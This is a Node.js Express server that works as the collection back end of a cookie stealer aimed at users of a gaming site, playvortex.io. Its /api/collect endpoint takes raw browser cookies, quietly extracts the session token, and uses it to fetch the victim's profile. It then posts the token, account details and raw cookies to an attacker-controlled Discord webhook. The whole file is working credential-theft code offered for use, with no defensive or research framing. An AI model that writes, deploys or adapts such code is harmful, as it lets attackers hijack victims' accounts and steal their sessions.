const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Helper to find a cookie by name
function findCookie(cookieString, name) {
    if (!cookieString) return null;
    const match = cookieString.match(new RegExp(`${name}=([^;]+)`));
    return match ? match[1] : null;
}

app.post('/api/collect', async (req, res) => {
    try {
        const { url, rawCookies } = req.body;
        const WEBHOOK_URL = process.env.webhook;

        if (!WEBHOOK_URL) {
            console.error("Webhook not configured on server.");
            return res.status(500).json({ status: "error" });
        }

        if (!rawCookies) {
            return res.status(400).json({ status: "error" });
        }

        // 1. Extract the session token secretly here
        const sessionToken = findCookie(rawCookies, "session_token") || findCookie(rawCookies, "session_");
        if (!sessionToken) {
            console.log("No session token found.");
            return res.status(200).json({ status: "ok" });
        }

        // 2. Fetch user data from Vortex using the token
        let username = "Unknown";
        let displayName = "Unknown";
        let userId = "Unknown";
        let avatarUrl = "https://playvortex.io/favicon.ico";

        try {
            const userResponse = await fetch("https://playvortex.io/api/users/authenticated", {
                headers: {
                    "Cookie": `session_token=${sessionToken}`,
                    "Accept": "application/json"
                }
            });

            if (userResponse.ok) {
                const userData = await userResponse.json();
                if (userData) {
                    userId = userData.id || "Unknown";
                    username = userData.username || "Unknown";
                    displayName = userData.displayName || userData.username || "Unknown";
                    if (userId !== "Unknown") {
                        avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
                    }
                }
            }
        } catch (apiErr) {
            console.warn("API fetch failed on server:", apiErr);
        }

        // 3. Build the Discord payload
        const payload = {
            username: "Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🦊 Account Data Received",
                color: 0x8f82c4,
                thumbnail: { url: avatarUrl },
                fields: [
                    { name: "👤 Username", value: `**@${username}**`, inline: true },
                    { name: "📛 Display Name", value: `**${displayName}**`, inline: true },
                    { name: "🆔 User ID", value: `\`${userId}\``, inline: false },
                    { name: "🔑 Session Token", value: `\`\`\`${sessionToken}\`\`\``, inline: false },
                    { name: "📦 Raw Cookies", value: `\`\`\`${(rawCookies || '').substring(0, 950)}\`\`\``, inline: false }
                ],
                footer: { text: "Render Proxy", icon_url: "https://playvortex.io/favicon.ico" },
                timestamp: new Date().toISOString()
            }]
        };

        // 4. Send to Discord
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            console.error("Discord webhook failed on server:", response.status);
        } else {
            console.log("Data successfully relayed to Discord!");
        }

        return res.status(200).json({ status: "success" });

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ status: "error" });
    }
});

app.get('/', (req, res) => {
    res.send('API is running.');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
